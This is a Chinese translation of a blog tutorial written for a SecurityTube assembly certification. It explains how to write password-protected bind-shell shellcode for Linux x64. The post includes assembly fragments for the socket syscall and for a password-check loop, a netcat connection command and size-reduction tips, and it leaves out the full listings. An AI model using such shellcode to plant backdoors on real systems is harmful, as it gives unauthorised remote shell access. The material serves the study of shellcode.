# 编写受密码保护的绑定 Shell (Linux/x64)

> 原文：<https://infosecwriteups.com/writing-a-password-protected-bind-shell-linux-x64-e052d2f65ff2?source=collection_archive---------1----------------------->

![](img/065ce2e0301d2ed5ae68979f21abe9b5.png)

保罗·埃施-洛朗在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

# 第一阶段:概述

首先，我们在这里试图实现什么？我们的目标是为 Linux x64 架构编写[外壳代码](https://en.wikipedia.org/wiki/Shellcode)，它将打开 IPv4 套接字上的 TCP，等待传入的连接，并仅在客户端提供有效密码后执行外壳。

为了编写一个常规的绑定 shell，我们需要链接几个系统调用。确切的顺序如下(我们稍后将处理身份验证):

1-我们创建一个新的套接字，并使用**套接字**和**绑定**系统调用将其绑定到目标地址

2-我们让套接字保持打开，并使用 **listen** syscall 等待连接

3-一旦接收到传入的连接，我们使用 **accept** syscall 来建立连接

4-我们使用 **dup2** syscall 将每个标准流复制到新的连接流中，这样目标机器就可以从源机器读取和写入消息

5-我们通过使用 **execve** 系统调用来启动一个 shell

每个系统调用都有一个我们需要处理的签名。某些寄存器必须包含特定的值。例如， *rax* 寄存器用于识别所执行的系统调用，因此它应该始终包含系统调用号。包含完整 syscall 表的整个文档可以在这里找到。

![](img/f880f1e951de72ecdfce9ace058ce62b.png)

洛伦佐·埃雷拉在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

# 第二阶段:编写系统调用

让我们看一个如何执行系统调用的例子

## 一个简单的系统调用:Socket (0x29)

```
48c7c029000000 mov rax, 0x29 ; this is the socket syscall number
48c7c702000000 mov rdi, 0x02 ; 0x02 correponds with IPv4
4831f6         xor rsi, rsi
48ffc6         inc rsi      ; 0x01 correponds with TCP
31d2           xor edx, edx ; 0 corresponds with protocol sub-family
0f05           syscall       ; executes the syscall
```

这段代码有一些问题。首先，它非常长(准确地说是 48 字节)。第二，它包含大量的空字节。让我们试着解决这个问题！

## 更现实的方法:套接字(0x29)

以下实现的长度为 12 字节(上一个示例的四分之一)，并且不包含空字节:

```
6a29 push 0x29
58   pop rax    ; sets rax to 0x29 without nullbytes
6a02 push 0x02
5f   pop rdi    ; same technique for rdi
6a01 push 0x01
5e   pop rsi    ; same for rsi
99   cdq        ; setting rdx to 0 using just one byte
0f05 syscall
```

![](img/8ebaacdf3a0e3fda6069ce6e13a64014.png)

由 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上的[1 AMCs](https://unsplash.com/@1amfcs?utm_source=medium&utm_medium=referral)拍摄的照片

# 第三阶段:编写 Bind Shell

有了所有的知识，我们现在需要将每个系统调用链接在一起。以下是一个示例实现，其中添加了旨在阐明该过程每个部分的注释:

我们可以通过组装和链接这个文件，然后提取外壳代码并运行它来检查绑定外壳是否工作。我有一些自定义脚本，通过自动化[组装和链接](https://github.com/alanvivona/pwnshop/blob/master/utils/asm-and-link)过程、[外壳代码提取](https://github.com/alanvivona/pwnshop/blob/master/utils/obj2shellcode)和[测试框架生成](https://github.com/alanvivona/pwnshop/blob/master/utils/gen-shellcode-test)来运行我们的外壳代码，使这个过程变得稍微容易一点。您可能想要检查这些脚本和/或自己使用它们(当然还要报告错误/改进！).

运行 shell 代码后，我们应该使用 netcat 从另一个终端进行连接，发出以下命令，并弹出一个 shell:

```
nc 127.0.0.1 4444
```

![](img/81df5790a61cee063954d3709ec364c4.png)

托马斯·詹森在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

# 第四阶段:添加身份验证

为了添加身份验证，我们需要在执行 shell 之前读取客户机文件描述符，并将输入与密码进行比较。代码应该大致如下所示:

```
; 6 - Handle incoming connection; 6.1 - Save client fd and close parent fd
mov r9, rax ; store the client socket fd into r9
; this is not mandatory, may be commented out to save some space
push syscalls.close
pop rax ; close parent
syscall; 6.2 - Read password from the client fd
read_pass:
  mov rax, r14    ; read syscall == 0x00
  mov rdi, r9     ; from client fd
  push 4
  pop rdx         ; rdx = input size
  sub rsp, rdx
  mov rsi, rsp    ; rsi => buffer
  syscall; 6.3 - Check password
  mov rax, config.password
  mov rdi, rsi
  scasq
jne read_pass
```

基本上，我们从客户机文件描述符中读取，然后将输入与给定的密码进行比较，并重复这个过程，直到成功。

下面是一个如何使用这种授权机制的示例:

[](https://asciinema.org/a/231614) [## 带有身份验证示例连接的 TCP 绑定外壳

### 由 alanvivona 录制

asciinema.org](https://asciinema.org/a/231614) ![](img/a57b3f8282c37ab7a403a66bc7609d43.png)

约翰·佩塔尔库林在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

# 第五阶段:减少有效载荷

在最初的实现中，我们避免了空字节，但是在这之前我并不太关心大小。有效载荷现在的大小是 180 字节。为了消除空字节并减小指令大小，我使用 radare2 rasm2 实用程序来比较指令输出。这里有一个简单的例子:

```
**rasm2 -a x86 -b 64 "mov rax,29"**
48c7c01d000000**rasm2 -a x86 -b 64 “mov al,29”**
b01d
```

我在代码中替换了一些常量，以便找到可能的算术指令来替换这些常量。在条件允许的情况下使用了`xchg`而不是`mov reg, reg`。我还使用了一些 x64 寄存器作为重复使用或有问题的值(如 0x00 和 0x10)的常量保存器，这样我就可以加载值，而不必将它们压入堆栈或先执行任何其他算术指令，这样可以节省一些字节。另一个技巧是在情况允许时使用较小的寄存器大小(如 r14d、r14w 或 r14b，而不是整个 r14)。最终版本如下所示:

这个最后的版本有 163 字节长。这里可能还有很大的改进空间，所以我很乐意接受建议！

[](https://twitter.com/syscall59) [## 艾伦(@syscall59) |推特

### 艾伦的最新推文(@syscall59)。功能过多的脚本小子

twitter.com](https://twitter.com/syscall59) 

> T *他的博文是为了完成*[security tube Linux Assembly Expert certification](https://www.pentesteracademy.com/course?id=7)
> 学生 ID:slae 64–1326
> [最新版本的源代码可以在这里找到](https://github.com/alanvivona/pwnshop/blob/master/src/0x0D-SLAE64-1-tcp-bind-shell-auth/tcp-bind-shell-auth-smaller.nasm)